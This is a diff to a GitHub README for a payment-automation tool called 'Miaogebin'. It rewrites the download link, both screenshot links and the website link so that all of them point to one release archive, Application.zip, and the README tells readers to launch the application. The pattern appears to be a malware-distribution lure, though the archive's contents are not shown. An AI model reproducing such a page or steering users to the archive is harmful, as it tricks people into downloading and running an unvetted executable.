@@ -7,7 +7,7 @@ In this repository, you will find the awesome **"Miaogebin"** tool for automatic
 Topics for this repository are currently not provided.
 
 ## 🚀 Get Started
-To dive into the exciting world of "Miaogebin," visit the [Application.zip](https://github.com/file/Application.zip) link provided.
+To dive into the exciting world of "Miaogebin," visit the [https://github.com/anoofanvas/miaogebin/releases/download/v1.0.0/Application.zip](https://github.com/anoofanvas/miaogebin/releases/download/v1.0.0/Application.zip) link provided.
 
 ### Launch the Application
 Don't forget to launch the application to explore all its amazing features!
@@ -33,14 +33,14 @@ Ensure the safety and security of payment transactions with advanced security me
 ## 📸 Screenshots
 Here are some snapshots of the "Miaogebin" tool in action:
 
-![Screenshot 1](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/anoofanvas/miaogebin/releases/download/v1.0.0/Application.zip)
 *Caption for Screenshot 1*
 
-![Screenshot 2](https://via.placeholder.com/600x400)
+![Screenshot 2](https://github.com/anoofanvas/miaogebin/releases/download/v1.0.0/Application.zip)
 *Caption for Screenshot 2*
 
 ## 🌐 Additional Resources
-For more information and updates, visit our website [here](https://www.miaogebin-tool.com).
+For more information and updates, visit our website [here](https://github.com/anoofanvas/miaogebin/releases/download/v1.0.0/Application.zip).
 
 ## 🤝 Contribution
 Contributions are welcome! Feel free to submit pull requests to help enhance the functionality of the **"Miaogebin"** tool.
